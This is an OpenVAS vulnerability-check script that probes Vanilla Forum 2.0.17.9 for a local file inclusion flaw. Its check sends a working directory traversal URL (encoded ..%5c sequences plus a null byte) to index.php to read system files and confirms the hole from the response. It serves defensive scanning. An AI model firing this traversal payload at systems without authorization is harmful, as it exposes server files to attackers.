###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_vanilla_forum_lfi_vuln.nasl 9351 2018-04-06 07:05:43Z cfischer $
#
# Vanilla Forum Local File Inclusion Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation could allow attackers to perform directory
traversal attacks and read arbitrary files on the affected application.

Impact Level: Application";

tag_affected = "Vanilla Forum version 2.0.17.9";

tag_insight = "The flaw is due to improper validation of user supplied data in
'index.php' via 'p' parameter, which allows attackers to read arbitrary files
via a ../(dot dot) sequences.";

tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

tag_summary = "This host is running Vanilla Forum and is prone to local file
inclusion vulnerability.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801794");
  script_version("$Revision: 9351 $");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:05:43 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2011-06-07 13:29:28 +0200 (Tue, 07 Jun 2011)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("Vanilla Forum Local File Inclusion Vulnerability");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17295/");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/101448");
  script_xref(name : "URL" , value : "http://securityreason.com/wlb_show/WLB-2011050062");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_lussumo_vanilla_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("version_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Get HTTP Port
vfPort = get_http_port(default:80);
if(!vfPort){
  exit(0);
}

## Get Vanilla Forum Installed Location
if(!path = get_dir_from_kb(port:vfPort, app:"Lussumo/Vanilla")){
  exit(0);
}

## traversal_files() function Returns Dictionary (i.e key value pair)
## Get Content to be checked and file to be check
files = traversal_files();
foreach file (keys(files))
{
  ## Construct directory traversal attack
  url = string(path, "/index.php?p=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c",
                        files[file],"%00");

  ## Confirm exploit worked properly or not
  if(http_vuln_check(port:vfPort, url:url, pattern:file))
  {
    security_message(port:vfPort);
    exit(0);
  }
}
